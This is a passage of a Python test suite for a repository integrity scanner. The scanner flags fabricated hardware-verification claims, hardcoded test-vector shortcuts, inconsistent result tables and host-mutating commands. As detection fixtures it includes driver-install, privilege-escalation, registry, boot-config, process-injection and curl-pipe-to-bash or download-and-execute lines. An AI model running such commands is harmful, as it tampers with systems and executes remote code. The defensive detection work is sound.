                manifest, root / "manifest.json", check_files=True
            )
            self.assertTrue(any("escapes" in error for error in errors))


class RepositoryLocationTests(unittest.TestCase):
    def test_library_uses_repository_root(self):
        self.assertEqual(agent_integrity.REPO_ROOT, REPO_ROOT)


class SuiteAccountingInvariantTests(unittest.TestCase):
    """Dynamic suite accounting invariant tests ensuring zero hardcoded arithmetic errors."""

    def test_synthetic_aggregation_and_partition_invariants(self) -> None:
        """Construct synthetic GateExecutionResult fixtures and verify dynamic aggregation and partition invariants."""
        from run_all_silicon_tests import (
            STATUS_BLOCKED,
            STATUS_FAIL,
            STATUS_PASS,
            GateExecutionResult,
            NativeGate,
            summarize_suite_execution,
        )

        synth_gates = (
            NativeGate(
                gate_id="SYNTH_1",
                title="Synthetic Gate 1",
                script=Path("tests/test_s1.py"),
                backend_label="s1",
                expected_total=15,
            ),
            NativeGate(
                gate_id="SYNTH_2",
                title="Synthetic Gate 2",
                script=Path("tests/test_s2.py"),
                backend_label="s2",
                expected_total=20,
            ),
            NativeGate(
                gate_id="SYNTH_3",
                title="Synthetic Gate 3",
                script=Path("tests/test_s3.py"),
                backend_label="s3",
                expected_total=10,
            ),
        )

        results = [
            GateExecutionResult(
                gate=synth_gates[0],
                success=False,
                status=STATUS_FAIL,
                exit_code=1,
                cases_selected=15,
                cases_executed=15,
                cases_passed=0,
                cases_failed=5,
                cases_unverified=10,
                cases_skipped=0,
                cases_xfailed=0,
                case_results=(),
                duration_seconds=0.1,
            ),
            GateExecutionResult(
                gate=synth_gates[1],
                success=True,
                status=STATUS_PASS,
                exit_code=0,
                cases_selected=20,
                cases_executed=20,
                cases_passed=20,
                cases_failed=0,
                cases_unverified=0,
                cases_skipped=0,
                cases_xfailed=0,
                case_results=(),
                duration_seconds=0.2,
            ),
            GateExecutionResult(
                gate=synth_gates[2],
                success=False,
                status=STATUS_BLOCKED,
                exit_code=None,
                cases_selected=10,
                cases_executed=0,
                cases_passed=0,
                cases_failed=0,
                cases_unverified=0,
                cases_skipped=0,
                cases_xfailed=0,
                case_results=(),
                duration_seconds=0.0,
            ),
        ]

        # Calculate all expected totals dynamically from synthetic fixture definitions
        expected_selected = sum(g.expected_total for g in synth_gates)
        expected_executed = sum(r.cases_executed for r in results)
        expected_matching = sum(r.cases_passed + r.cases_unverified for r in results)
        expected_failed = sum(r.cases_failed for r in results)
        expected_blocked = sum(
            r.cases_selected for r in results if r.status == STATUS_BLOCKED
        )
        expected_physically_verified = sum(r.cases_passed for r in results if r.success)
        expected_unverified_provenance = (
            expected_executed - expected_physically_verified
        )

        summary = summarize_suite_execution(results, synth_gates)
        summary.validate_invariants()

        self.assertEqual(summary.total_cases_selected, expected_selected)
        self.assertEqual(summary.total_cases_executed, expected_executed)
        self.assertEqual(summary.total_cases_matching, expected_matching)
        self.assertEqual(summary.total_cases_failed, expected_failed)
        self.assertEqual(summary.total_cases_blocked, expected_blocked)
        self.assertEqual(
            summary.total_cases_physically_verified, expected_physically_verified
        )
        self.assertEqual(
            summary.total_cases_unverified_provenance, expected_unverified_provenance
        )
        self.assertEqual(
            summary.total_cases_matching
            + summary.total_cases_failed
            + summary.total_cases_blocked,
            summary.total_cases_selected,
        )

    def test_historical_commit_0fc2072_baseline_aggregation(self) -> None:
        """Verify dynamic aggregation on the explicitly named historical commit 0fc2072 baseline fixture."""
        from run_all_silicon_tests import (
            GATES,
            STATUS_FAIL,
            STATUS_SELF_REPORTED_UNVERIFIED,
            GateExecutionResult,
            summarize_suite_execution,
        )

        historical_commit_0fc2072_outcomes: dict[str, tuple[int, int]] = {
            # (unverified_matching, failing)
            "DR0": (24, 0),
            "DR1": (33, 0),
            "DR2a": (13, 0),
            "DR2b": (13, 0),
            "DR2c": (11, 0),
            "DR2d": (0, 25),
            "DR3": (25, 0),
            "DR4": (25, 0),
            "DR5": (25, 0),
            "DR6": (25, 0),
            "DR7": (25, 0),
            "DR8": (75, 0),
            "DR9": (122, 0),
            "DR10": (40, 0),
            "DR11": (25, 0),
            "DR12": (30, 0),
            "DR13": (30, 0),
            "DR14": (72, 13),
            "DR15": (49, 36),
        }

        results: list[GateExecutionResult] = []
        for gate in GATES:
            unverified_count, failed_count = historical_commit_0fc2072_outcomes[
                gate.gate_id
            ]
            res = GateExecutionResult(
                gate=gate,
                success=False,
                status=STATUS_FAIL
                if failed_count > 0
                else STATUS_SELF_REPORTED_UNVERIFIED,
                exit_code=1 if failed_count > 0 else 0,
                cases_selected=gate.expected_total,
                cases_executed=gate.expected_total,
                cases_passed=0,
                cases_failed=failed_count,
                cases_unverified=unverified_count,
                cases_skipped=0,
                cases_xfailed=0,
                case_results=(),
                duration_seconds=0.1,
            )
            results.append(res)

        summary = summarize_suite_execution(results, GATES)
        summary.validate_invariants()

        self.assertEqual(summary.total_cases_selected, 736)
        self.assertEqual(summary.total_cases_executed, 736)
        self.assertEqual(summary.total_cases_matching, 662)
        self.assertEqual(summary.total_cases_failed, 74)
        self.assertEqual(summary.total_cases_blocked, 0)
        self.assertEqual(summary.total_cases_physically_verified, 0)
        self.assertEqual(summary.total_cases_unverified_provenance, 736)
        self.assertEqual(
            summary.total_cases_matching
            + summary.total_cases_failed
            + summary.total_cases_blocked,
            summary.total_cases_selected,
        )


class KernelIntegrityAndAntiFabricationTests(unittest.TestCase):
    """Adversarial and invariant tests for repository-wide kernel integrity policy."""

    def scan_md(self, text: str):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / "test_doc.md"
            path.write_text(text, encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                return scan_markdown_file(relative)

    def scan_cpp(self, text: str):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / "kernel.cc"
            path.write_text(text, encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                return scan_cpp_file(relative)

    def test_physical_claim_verified_on_phoenix_aie2_hardware_is_caught(self):
        findings = self.scan_md("The kernel was verified on Phoenix AIE2 hardware.\n")
        self.assertTrue(
            any(f.rule == "DOC001" and f.severity == "critical" for f in findings)
        )

    def test_physical_claim_result_confirmed_on_silicon_is_caught(self):
        findings = self.scan_md("The result was confirmed on silicon.\n")
        self.assertTrue(
            any(f.rule == "DOC001" and f.severity == "critical" for f in findings)
        )

    def test_physical_claim_all_cases_passed_on_physical_npu_is_caught(self):
        findings = self.scan_md("All cases passed on the physical NPU.\n")
        self.assertTrue(
            any(f.rule == "DOC001" and f.severity == "critical" for f in findings)
        )

    def test_nearby_disclaimer_does_not_suppress_later_physical_claim(self):
        doc = (
            "This test suite does not claim physical silicon execution.\n\n"
            "Execution completed successfully.\n\n"
            "The result was physically verified on device.\n"
        )
        findings = self.scan_md(doc)
        self.assertTrue(
            any(f.rule == "DOC001" and f.severity == "critical" for f in findings)
        )

    def test_cpp_known_vector_specialization_is_detected(self):
        code = "if (request_id == 0x90000001) return expected_output;\n"
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP006" and f.severity == "critical" for f in findings)
        )

    def test_cpp_input_fingerprint_specialization_is_detected(self):
        code = "if (sha256(input) == known_hash) { return 0; }\n"
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP006" and f.severity == "critical" for f in findings)
        )

    def test_cpp_expected_output_copy_is_detected(self):
        code = "memcpy(out_buf, expected_output, 32);\n"
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP007" and f.severity == "critical" for f in findings)
        )

    def test_cpp_host_fallback_call_is_detected(self):
        code = "if (hw_error) run_host_fallback();\n"
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP008" and f.severity == "critical" for f in findings)
        )

    def test_markdown_accounting_table_inconsistent_sum_is_detected(self):
        table = (
            "# Silicon Results\n\n"
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR0  | 1   | 1   | 1   | 0 |\n"
            "| DR1  | 33  | 33  | 33  | 0 |\n"
            "| DR2a | 13  | 13  | 13  | 0 |\n"
            "| DR9  | 85  | 85  | 85  | 0 |\n"
            "| Total | 736 | 736 | 664 | 72 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC004"
                and f.severity == "critical"
                and "mismatch" in f.message
                for f in findings
            )
        )

    def test_markdown_accounting_table_valid_synthetic_table_passes(self):
        table = (
            "# Synthetic Results\n\n"
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR0  | 10 | 10 | 10 | 0 |\n"
            "| DR1  | 20 | 20 | 20 | 0 |\n"
            "| DR2  | 15 | 15 | 10 | 5 |\n"
            "| Total | 45 | 45 | 40 | 5 |\n"
        )
        findings = self.scan_md(table)
        blocking = [f for f in findings if f.severity == "critical"]
        self.assertEqual(blocking, [])

    def test_markdown_accounting_table_negative_count_is_detected(self):
        table = (
            "| Gate | Selected | Executed |\n"
            "| :--- | :---: | :---: |\n"
            "| DR0  | -5 | 5 |\n"
            "| Total | 0 | 5 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC004"
                and f.severity == "critical"
                and "Negative count" in f.message
                for f in findings
            )
        )

    def test_markdown_accounting_table_duplicate_gate_id_is_detected(self):
        table = (
            "| Gate | Selected | Executed |\n"
            "| :--- | :---: | :---: |\n"
            "| DR1  | 10 | 10 |\n"
            "| DR1  | 10 | 10 |\n"
            "| Total | 20 | 20 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC005"
                and f.severity == "critical"
                and "Duplicate gate" in f.message
                for f in findings
            )
        )

    def test_markdown_accounting_table_conflicting_totals_is_detected(self):
        table = (
            "| Gate | Selected | Executed |\n"
            "| :--- | :---: | :---: |\n"
            "| DR1  | 10 | 10 |\n"
            "| Total | 10 | 10 |\n"
            "| Total | 20 | 20 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC005"
                and f.severity == "critical"
                and "Conflicting total" in f.message
                for f in findings
            )
        )

    def test_public_deterministic_vectors_described_as_hidden_is_flagged(self):
        findings = self.scan_md("These deterministic vectors are hidden inputs.\n")
        self.assertTrue(
            any(f.rule == "DOC006" and f.severity == "critical" for f in findings)
        )

    def test_static_scanner_success_claimed_as_semantic_proof_is_flagged(self):
        findings = self.scan_md(
            "Zero scanner findings proves cryptographic correctness.\n"
        )
        self.assertTrue(
            any(f.rule == "DOC006" and f.severity == "critical" for f in findings)
        )

    def test_cache_hit_described_as_fresh_build_is_flagged(self):
        findings = self.scan_md("Completed warm cache fresh compile successfully.\n")
        self.assertTrue(
            any(f.rule == "DOC006" and f.severity == "critical" for f in findings)
        )

    def test_repository_root_citation_is_flagged(self):
        findings = self.scan_md("evidence source: https://github.com/Xilinx/llvm-aie\n")
        self.assertTrue(
            any(f.rule == "DOC007" and f.severity == "critical" for f in findings)
        )

    def test_committed_git_blob_and_compiled_worktree_input_hashes_distinction(self):
        doc = (
            "| Source Path | Line Endings |\n"
            "| :--- | :---: |\n"
            "| `COMMITTED_GIT_BLOB` | LF |\n"
            "| `COMPILED_WORKTREE_INPUT` | CRLF |\n"
        )
        findings = self.scan_md(doc)
        blocking = [f for f in findings if f.severity == "critical"]
        self.assertEqual(blocking, [])

    def test_fabricated_commit_fails_closed(self):
        fake_sha = "f" * 40
        doc = f"[CLAIM-PROVENANCE: status=VERIFIED; evidence=docs/manifest.json; commit={fake_sha}; classification=HOST_REFERENCE]\n[VERIFIED PHYSICAL SILICON]\n"
        findings = self.scan_md(doc)
        self.assertTrue(
            any(f.rule == "DOC002" and f.severity == "critical" for f in findings)
        )

    def test_excluded_policy_paths_only_contains_agent_integrity(self):
        self.assertEqual(EXCLUDED_POLICY_PATHS, {Path("tools/agent_integrity.py")})

    def test_legitimate_cpp_abi_validation_is_clean(self):
        code = (
            "static inline bool valid_descriptor(const uint8_t d[16]) {\n"
            "  return d[0] == 1 && d[1] == 0x24 && d[2] == 0x52 && d[3] == 0;\n"
            "}\n"
            "static inline uint32_t mod_mul(uint32_t a, uint32_t b) {\n"
            "  return (a * b) % 3329u;\n"
            "}\n"
        )
        findings = self.scan_cpp(code)
        self.assertEqual(findings, [])

    def test_review_finding_1_production_model_verified_hardware_is_caught(self):
        doc = "The production model was verified on Phoenix AIE2 hardware.\n"
        findings = self.scan_md(doc)
        self.assertTrue(
            any(f.rule == "DOC001" and f.severity == "critical" for f in findings)
        )

    def test_review_finding_2_accounting_malformed_10x_is_caught(self):
        table = (
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR0 | 10x | 10 | 10 | 0 |\n"
            "| Total | 10 | 10 | 10 | 0 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC004"
                and f.severity == "critical"
                and "Malformed numeric cell" in f.message
                for f in findings
            )
        )

    def test_review_finding_3_accounting_partition_mismatch_is_caught(self):
        table = (
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR0 | 10 | 10 | 10 | 5 |\n"
            "| Total | 10 | 10 | 10 | 5 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC004"
                and f.severity == "critical"
                and "Row partition mismatch" in f.message
                for f in findings
            )
        )

    def test_review_finding_4_accounting_fabricated_dr999_is_caught(self):
        table = (
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR999 | 10 | 10 | 10 | 0 |\n"
            "| Total | 10 | 10 | 10 | 0 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC005" and f.severity == "critical" and "DR999" in f.message
                for f in findings
            )
        )

    def test_review_finding_5_multiline_known_vector_branch_is_caught(self):
        code = (
            "int check(int request_id) {\n"
            "    if (\n"
            "        request_id == 0x90000001\n"
            "    ) {\n"
            "        return expected;\n"
            "    }\n"
            "    return 0;\n"
            "}\n"
        )
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP006" and f.severity == "critical" for f in findings)
        )

    def test_review_finding_6_multiline_fallback_call_is_caught(self):
        code = "void run() {\n    run_host_fallback\n        (input, output);\n}\n"
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP008" and f.severity == "critical" for f in findings)
        )

    def test_multiline_cpp_switch_case_on_request_id_is_caught(self):
        code = (
            "int check(int request_id) {\n"
            "    switch (request_id) {\n"
            "        case 0x90000001:\n"
            "            return 1;\n"
            "        default:\n"
            "            return 0;\n"
            "    }\n"
            "}\n"
        )
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP006" and f.severity == "critical" for f in findings)
        )

    def test_multiline_cpp_ternary_on_tc_id_is_caught(self):
        code = "int check(int tc_id) {\n    return (tc_id == 42) ? 1 : 0;\n}\n"
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP006" and f.severity == "critical" for f in findings)
        )

    def test_multiline_cpp_reversed_operands_known_vector_is_caught(self):
        code = (
            "int check(int request_id) {\n"
            "    if (0x90000001 == request_id) {\n"
            "        return 1;\n"
            "    }\n"
            "    return 0;\n"
            "}\n"
        )
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP006" and f.severity == "critical" for f in findings)
        )

    def test_multiline_cpp_std_copy_expected_is_caught(self):
        code = (
            "void copy_out(uint8_t* dst) {\n"
            "    std::copy(\n"
            "        expected_output,\n"
            "        expected_output + 32,\n"
            "        dst\n"
            "    );\n"
            "}\n"
        )
        findings = self.scan_cpp(code)
        self.assertTrue(
            any(f.rule == "CPP007" and f.severity == "critical" for f in findings)
        )

    def test_cpp_comments_and_strings_with_test_ids_not_flagged(self):
        code = (
            "// Note: ACVP request_id == 0x90000001 describes the normative format\n"
            "/* Multi-line comment referencing\n"
            "   run_host_fallback(x, y);\n"
            "   memcpy(out, expected_output, 32);\n"
            "*/\n"
            'const char* desc = "request_id == 0x90000001 or run_host_fallback()";\n'
            "void valid_function(uint8_t* buf) {\n"
            "    buf[0] = 0x01;\n"
            "}\n"
        )
        findings = self.scan_cpp(code)
        self.assertEqual(findings, [])

    def test_mixed_line_prohibits_and_confirmed_on_silicon_is_caught(self):
        doc = "This policy prohibits unsupported claims; the kernel was confirmed on silicon.\n"
        findings = self.scan_md(doc)
        self.assertTrue(
            any(f.rule == "DOC001" and f.severity == "critical" for f in findings)
        )

    def test_bullet_with_verify_making_physical_claim_is_caught(self):
        doc = "- Verify that the kernel was confirmed on silicon.\n"
        findings = self.scan_md(doc)
        self.assertTrue(
            any(f.rule == "DOC001" and f.severity == "critical" for f in findings)
        )

    def test_bullet_with_validate_making_physical_claim_is_caught(self):
        doc = "- Validate the module was physically verified.\n"
        findings = self.scan_md(doc)
        self.assertTrue(
            any(f.rule == "DOC001" and f.severity == "critical" for f in findings)
        )

    def test_legitimate_negative_physical_statements_are_clean(self):
        doc = (
            "This result is not physically verified.\n"
            "Physically verified cases: 0\n"
            "0 independently physically verified gates\n"
            "- It does not claim performance, latency, throughput, power, utilization, constant-time resistance, or side-channel immunity.\n"
        )
        findings = self.scan_md(doc)
        blocking = [f for f in findings if f.severity == "critical"]
        self.assertEqual(blocking, [])

    def test_accounting_table_inconsistent_row_width_is_detected(self):
        table = (
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR0 | 10 | 10 | 10 |\n"
            "| Total | 10 | 10 | 10 | 0 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC004"
                and f.severity == "critical"
                and "Inconsistent table row width" in f.message
                for f in findings
            )
        )

    def test_accounting_table_selected_less_than_executed_is_detected(self):
        table = (
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR0 | 5 | 10 | 10 | 0 |\n"
            "| Total | 5 | 10 | 10 | 0 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC004"
                and f.severity == "critical"
                and "cases_executed (10) > cases_selected (5)" in f.message
                for f in findings
            )
        )

    def test_canonical_accounting_table_missing_canonical_gate_is_detected(self):
        table = (
            "# Master Physical Silicon Regression Suite Accounting\n\n"
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR0 | 24 | 24 | 24 | 0 |\n"
            "| DR1 | 33 | 33 | 33 | 0 |\n"
            "| Total | 57 | 57 | 57 | 0 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC005"
                and f.severity == "critical"
                and "Missing canonical gate" in f.message
                for f in findings
            )
        )

    def test_canonical_accounting_table_out_of_order_is_detected(self):
        table = (
            "# Master Silicon Accounting\n\n"
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR1 | 33 | 33 | 33 | 0 |\n"
            "| DR0 | 24 | 24 | 24 | 0 |\n"
            "| Total | 57 | 57 | 57 | 0 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC005"
                and f.severity == "critical"
                and "out of order" in f.message
                for f in findings
            )
        )

    def test_canonical_accounting_table_missing_total_row_is_detected(self):
        table = (
            "# Master Silicon Regression Suite Accounting\n\n"
            "| Gate | Selected | Executed | Matching | Failing |\n"
            "| :--- | :---: | :---: | :---: | :---: |\n"
            "| DR0 | 24 | 24 | 24 | 0 |\n"
        )
        findings = self.scan_md(table)
        self.assertTrue(
            any(
                f.rule == "DOC005"
                and f.severity == "critical"
                and "Missing required Total row" in f.message
                for f in findings
            )
        )

    def test_complete_valid_canonical_accounting_table_passes(self):
        from run_all_silicon_tests import GATES

        lines = [
            "# Master Physical Silicon Regression Suite Accounting\n",
            "| Gate | Selected | Executed | Matching | Failing |",
            "| :--- | :---: | :---: | :---: | :---: |",
        ]
        tot_sel = 0
        tot_exec = 0
        tot_match = 0
        for g in GATES:
            gid = g.gate_id.upper()
            cnt = g.expected_total
            lines.append(f"| {gid} | {cnt} | {cnt} | {cnt} | 0 |")
            tot_sel += cnt
            tot_exec += cnt
            tot_match += cnt
        lines.append(f"| Total | {tot_sel} | {tot_exec} | {tot_match} | 0 |")
        table = "\n".join(lines) + "\n"
        findings = self.scan_md(table)
        blocking = [f for f in findings if f.severity == "critical"]
        self.assertEqual(blocking, [])


class HostAndDriverIntegrityTests(unittest.TestCase):
    def scan_source(self, filename: str, source: str):
        with tempfile.TemporaryDirectory(dir=REPO_ROOT) as temporary:
            path = Path(temporary) / filename
            path.write_text(source, encoding="utf-8")
            relative = path.relative_to(REPO_ROOT)
            with mock.patch.object(
                agent_integrity,
                "EXCLUDED_POLICY_PATHS",
                {Path("tools/agent_integrity.py")},
            ):
                return scan_file(relative)

    # Adversarial Tests
    def test_pnputil_add_driver_is_blocked(self):
        ps_findings = self.scan_source(
            "install.ps1", "pnputil.exe /add-driver C:\\Drivers\\bad.inf /install\n"
        )
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in ps_findings)
        )

        py_findings = self.scan_source(
            "setup.py",
            'subprocess.run(["pnputil", "/add-driver", "npu.inf"])\n',
        )
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in py_findings)
        )

        sh_findings = self.scan_source(
            "install.sh", "pnputil /add-driver ./driver.inf\n"
        )
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in sh_findings)
        )

    def test_pnputil_delete_driver_is_blocked(self):
        findings = self.scan_source("cleanup.ps1", "pnputil -d oem12.inf\n")
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in findings)
        )

        del_findings = self.scan_source(
            "cleanup.ps1", "pnputil.exe /delete-driver oem12.inf /uninstall /force\n"
        )
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in del_findings)
        )

    def test_pnputil_legacy_install_flags_are_blocked(self):
        findings_ia = self.scan_source("setup.ps1", "pnputil -i -a C:\\driver.inf\n")
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in findings_ia)
        )

        findings_ai = self.scan_source(
            "setup.ps1", "pnputil.exe -a -i C:\\driver.inf\n"
        )
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in findings_ai)
        )

    def test_devcon_driver_mutation_is_blocked(self):
        install_findings = self.scan_source(
            "dev.ps1", "devcon.exe install bad.inf PCI\\VEN_1022\n"
        )
        self.assertTrue(
            any(
                f.rule == "HOST001" and f.severity == "critical"
                for f in install_findings
            )
        )

        remove_findings = self.scan_source("dev.ps1", "devcon remove @ROOT\\AMD_NPU\n")
        self.assertTrue(
            any(
                f.rule == "HOST001" and f.severity == "critical"
                for f in remove_findings
            )
        )

        restart_findings = self.scan_source("dev.ps1", "devcon restart PCI\\*\n")
        self.assertTrue(
            any(
                f.rule == "HOST001" and f.severity == "critical"
                for f in restart_findings
            )
        )

    def test_dism_driver_mutation_is_blocked(self):
        add_findings = self.scan_source(
            "setup.ps1",
            "dism.exe /online /add-driver /driver:C:\\drivers\\bad.inf\n",
        )
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in add_findings)
        )

        remove_findings = self.scan_source(
            "setup.ps1",
            "dism /image:C:\\mount /remove-driver /driver:oem1.inf\n",
        )
        self.assertTrue(
            any(
                f.rule == "HOST001" and f.severity == "critical"
                for f in remove_findings
            )
        )

    def test_privilege_escalation_is_blocked(self):
        ps_findings = self.scan_source(
            "elevate.ps1", "Start-Process powershell -Verb RunAs\n"
        )
        self.assertTrue(
            any(f.rule == "HOST002" and f.severity == "critical" for f in ps_findings)
        )

        runas_findings = self.scan_source(
            "elevate.cmd", "runas /user:Administrator cmd.exe\n"
        )
        self.assertTrue(
            any(
                f.rule == "HOST002" and f.severity == "critical" for f in runas_findings
            )
        )

        sudo_findings = self.scan_source("elevate.sh", "sudo apt-get install package\n")
        self.assertTrue(
            any(f.rule == "HOST002" and f.severity == "critical" for f in sudo_findings)
        )

    def test_windows_service_mutation_is_blocked(self):
        sc_create_findings = self.scan_source(
            "svc.ps1", 'sc.exe create BadSvc binPath= "C:\\bad.exe"\n'
        )
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in sc_create_findings
            )
        )

        sc_del_findings = self.scan_source("svc.ps1", "sc delete BadSvc\n")
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in sc_del_findings
            )
        )

        new_svc_findings = self.scan_source(
            "svc.ps1",
            'New-Service -Name "BadSvc" -BinaryPathName "C:\\bad.exe"\n',
        )
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in new_svc_findings
            )
        )

        set_svc_findings = self.scan_source(
            "svc.ps1", "Set-Service -Name 'BadSvc' -StartupType Automatic\n"
        )
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in set_svc_findings
            )
        )

        rm_svc_findings = self.scan_source("svc.ps1", "Remove-Service -Name 'BadSvc'\n")
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in rm_svc_findings
            )
        )

    def test_registry_system_mutation_is_blocked(self):
        reg_add_findings = self.scan_source(
            "reg.cmd", 'reg.exe add HKLM\\Software\\Bad /v Val /t REG_SZ /d "1"\n'
        )
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in reg_add_findings
            )
        )

        reg_del_findings = self.scan_source(
            "reg.cmd", 'reg delete "HKEY_LOCAL_MACHINE\\SYSTEM\\Bad" /f\n'
        )
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in reg_del_findings
            )
        )

        ps_reg_findings = self.scan_source(
            "reg.ps1",
            "Set-ItemProperty -Path 'HKLM:\\Software\\Bad' -Name 'Val' -Value 1\n",
        )
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in ps_reg_findings
            )
        )

        ps_rm_reg_findings = self.scan_source(
            "reg.ps1",
            "Remove-Item -Path 'Registry::HKEY_LOCAL_MACHINE\\Software\\Bad' -Recurse\n",
        )
        self.assertTrue(
            any(
                f.rule == "HOST003" and f.severity == "critical"
                for f in ps_rm_reg_findings
            )
        )

    def test_bcdedit_boot_mutation_is_blocked(self):
        findings_set = self.scan_source("boot.cmd", "bcdedit.exe /set testsigning on\n")
        self.assertTrue(
            any(f.rule == "HOST004" and f.severity == "critical" for f in findings_set)
        )

        findings_del = self.scan_source("boot.ps1", "bcdedit /deletevalue safeboot\n")
        self.assertTrue(
            any(f.rule == "HOST004" and f.severity == "critical" for f in findings_del)
        )

    def test_native_driver_apis_are_blocked(self):
        cpp_findings = self.scan_source(
            "driver_loader.cpp",
            "#include <windows.h>\nvoid load() { "
            + "SetupCopy"
            + 'OEMInfW(L"bad.inf", NULL, 0, 0, NULL, 0, NULL, NULL); }\n',
        )
        self.assertTrue(
            any(f.rule == "HOST005" and f.severity == "critical" for f in cpp_findings)
        )

        py_findings = self.scan_source(
            "driver_loader.py",
            "import ctypes\nctypes.windll.ntdll." + "NtLoad" + "Driver(driver_path)\n",
        )
        self.assertTrue(
            any(f.rule == "HOST005" and f.severity == "critical" for f in py_findings)
        )

    def test_process_injection_and_hooking_apis_are_blocked(self):
        cpp_findings = self.scan_source(
            "inject.cpp",
            "void inject(HANDLE hProc, void* remote, void* data, size_t sz) {\n"
            "    " + "WriteProcess" + "Memory(hProc, remote, data, sz, nullptr);\n"
            "    "
            + "CreateRemote"
            + "Thread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)remote, nullptr, 0, nullptr);\n"
            "}\n",
        )
        self.assertTrue(
            any(f.rule == "HOST006" and f.severity == "critical" for f in cpp_findings)
        )

        hook_findings = self.scan_source(
            "hook.cpp",
            "void hook() { "
            + "Detour"
            + "Attach(&(PVOID&)TrueTarget, HookTarget); }\n",
        )
        self.assertTrue(
            any(f.rule == "HOST006" and f.severity == "critical" for f in hook_findings)
        )

    def test_encoded_powershell_and_download_exec_are_blocked(self):
        enc_findings = self.scan_source(
            "run.ps1",
            "powershell.exe -EncodedCommand JABhACAAPQAgACIAMQAiAA==\n",
        )
        self.assertTrue(
            any(f.rule == "HOST007" and f.severity == "critical" for f in enc_findings)
        )

        dl_findings = self.scan_source(
            "run.ps1",
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/bad.ps1')\n",
        )
        self.assertTrue(
            any(f.rule == "HOST007" and f.severity == "critical" for f in dl_findings)
        )

        pipe_findings = self.scan_source(
            "run.sh", "curl -s http://example.com/bad.sh | bash\n"
        )
        self.assertTrue(
            any(f.rule == "HOST007" and f.severity == "critical" for f in pipe_findings)
        )

    def test_cmake_and_yaml_mutation_are_blocked(self):
        cmake_findings = self.scan_source(
            "CMakeLists.txt",
            "execute_process(COMMAND pnputil /add-driver bad.inf)\n",
        )
        self.assertTrue(
            any(
                f.rule == "HOST001" and f.severity == "critical" for f in cmake_findings
            )
        )

        yaml_findings = self.scan_source(
            "workflow.yml",
            "steps:\n  - run: pnputil.exe /add-driver driver.inf\n",
        )
        self.assertTrue(
            any(f.rule == "HOST001" and f.severity == "critical" for f in yaml_findings)
        )

    def test_yaml_literal_and_folded_run_block_semantics(self):
